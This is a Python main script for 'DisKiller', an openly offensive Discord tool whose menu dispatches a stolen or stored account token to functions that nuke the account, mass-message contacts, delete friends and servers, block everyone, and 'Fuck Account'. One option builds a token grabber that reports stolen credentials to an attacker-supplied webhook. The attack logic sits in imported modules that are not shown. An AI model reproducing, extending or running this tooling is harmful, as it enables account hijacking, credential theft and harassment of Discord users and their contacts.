from colorama import init, Fore, Style
import os
import sys
import fade
import time
import configparser
import requests
from data.common import *
from data.massDM import *
from data.closeDMs import *
from data.tokenInfo import *
from data.leaveServer import*
from data.fuckAccount import *
from data.accountNuker import *
from data.getAllFriends import*
from data.deleteFriends import *
from data.deleteServers import *
from data.createServers import *
from data.deleteWebhook import *
from data.DownloadToken import *
from data.blockAllFriends import *
from data.hypesquadChanger import *
from data.getAllAdminServers import *

# --------------- [ BroadCast ] --------------- #
def broadcast():
    url2 = "https://discord.gg/q4s332WhRn"
    r2 = requests.get(url2)
    if r2.ok:
        data = r2.text
        data2 = data.split(';')[1]
        print(f'[ + ] BroadCast: {data2}')
        input("\nPress the <ENTER> key to continue...")
broadcast()
 # ========================================================================================================================================================= #
conf = configparser.ConfigParser()
conf.read('config.ini')
config = conf['SETTINGS']
token = config.get('TOKEN', fallback=f"{Fore.RED}Err, No such Tokens.")
hwnd = ctypes.windll.kernel32.GetConsoleWindow()
set_window_transparency(hwnd, 200)
validateToken()

def main():
    clear_screen()
    os.system(f'title DisKiller V1.0 - Discord: {getDiscordCredits()}')

    # ========================================================================================================================================================= #

    banner = f"""{rr}
                         ██████╗ ██╗███████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
                         ██╔══██╗██║██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
                         ██║  ██║██║███████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
                         ██║  ██║██║╚════██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
                         ██████╔╝██║███████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
                         ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                        ╔═════════════════════════════════════════════════════════════╗
                        ║                    {w}Discord : https://discord.gg/q4s332WhRn{rr}                   ║
                     ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
                     ║ {rr}[{w}1{rr}]{w} Nuke Token         {rr}       ║   ║ [{w}11{rr}]{w} Get All Friends {rr}         ║  
                     ║ {rr}[{w}2{rr}]{w} Leave Servers      {rr}       ║   ║ [{w}12{rr}]{w} Token Info      {rr}         ║  
                     ║ {rr}[{w}3{rr}]{w} Delete Friends     {rr}       ║   ║ [{w}13{rr}]{w} Token Checker   {rr}         ║
                     ║ {rr}[{w}4{rr}]{w} Delete Servers     {rr}       ║   ║ [{w}14{rr}]{w} Fuck Account    {rr}         ║
                     ║ {rr}[{w}5{rr}]{w} Mass Dm            {rr}       ║   ║ [{w}15{rr}]{w} Delete Webhook  {rr}         ║
                     ║ {rr}[{w}6{rr}]{w} Close DMs          {rr}       ║   ║  {w}  {rr}                           ║
                     ║ {rr}[{w}7{rr}]{w} Create Servers     {rr}       ║   ║ [{w}16{rr}]{w} CREDITS         {rr}         ║
                     ║ {rr}[{w}8{rr}]{w} Get Administrators {rr}       ║   ║ [{w}17{rr}]{w} Token           {rr}         ║
                     ║ {rr}[{w}9{rr}]{w} Token Grabber      {rr}       ║   ║ [{w}18{rr}]{w} EXIT            {rr}         ║
                     ║ {rr}[{w}10{rr}]{w} Block All Friends {rr}       ║   ║                      {rr}         ║
                     ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
    """
    # faded_banner = fade.greenblue(banner)
    print(banner)

    # ========================================================================================================================================================= #

    info = f"""\t\t\t\t\t  {rr}[+] {w}disc: GRAYHAT. {rr}[+]"""
    for x in info:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()

# ========================================================================================================================================================= #
    choice = input(f"{rr}[ {w}DISKILER{rr} ] {w}:>{rr} ")
    if choice == "1":
        clear_banner()
        
        message = "@here Nuked by GrayHAT Tools"
        start_nuke(token=token, content=message)
    elif choice == "2":
        clear_banner()
        
        leaveServer(token)
    elif choice == "3":
        clear_banner()
        
        deleteFriends(token)
    elif choice == "4":
        clear_banner()
        
        deleteServers(token)
    elif choice == "5":
        clear_banner()
        
        message = input(f"{w}Message{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        massDM(token=token, content=message)
    elif choice == "6":
        clear_banner()
        
        close_all_dms(token=token)
    elif choice == "7":
        clear_banner()
        
        count = input(f"{w}Count{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        name = input(f"{w}Name{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        createServers(token=token, count=count, name=name)
    elif choice == "8":
        clear_banner()
        getAllAdminServers(token)
    elif choice == "9":
        clear_banner()
        webhook = input(f"Webhook{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        downloadGrabber(webhook=webhook)
    elif choice == "10":
        clear_banner()
        
        blockAllFriends(token=token)
    elif choice == "11":
        clear_banner()
        
        get_all_friends(token=token)
    elif choice == "12":
        clear_banner()
        
        tokenInfo(token=token)
    elif choice == "13":
        clear_banner()
        
        validateToken(token=token)
    elif choice == "14":
        clear_banner()
        
        fuckAccount(token=token)
    elif choice == "15":
        clear_banner()
        link = input(f"Webhook{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteWebhook(link)
    # elif choice == "16":
        # socials()
    elif choice == "17":
        tokenInputs = input(f"{rr}[{w} Enter A Vaild Token {rr}]{w} :>{rr} ")

        conf.set('SETTINGS', 'TOKEN', tokenInputs)
        with open('config.ini', 'w') as config2:
            conf.write(config2)
        validateToken()
        restartTokens()
    elif choice == "18":
        exit(-1)
    

# ========================================================================================================================================================= #

def socials():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("DisKiller")

    banner = f"""
            ██████╗ ██╗███████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
            ██╔══██╗██║██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
            ██║  ██║██║███████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
            ██║  ██║██║╚════██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
            ██████╔╝██║███████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
            ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                            
                            ╔════════════════════════════╗      
                            ║    Discord: GRAYHAT.      ║
                            ║   youtube.com/@GRAYHAT    ║  
                            ║   Instagram.com/GRAYHAT   ║  
                            ╚════════════════════════════╝   
    """
    faded_banner = fade.fire(banner)
    for x in faded_banner:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()
    time.sleep(2)
    input("Press any key to continue...")

# ========================================================================================================================================================= #

while True:
    main()
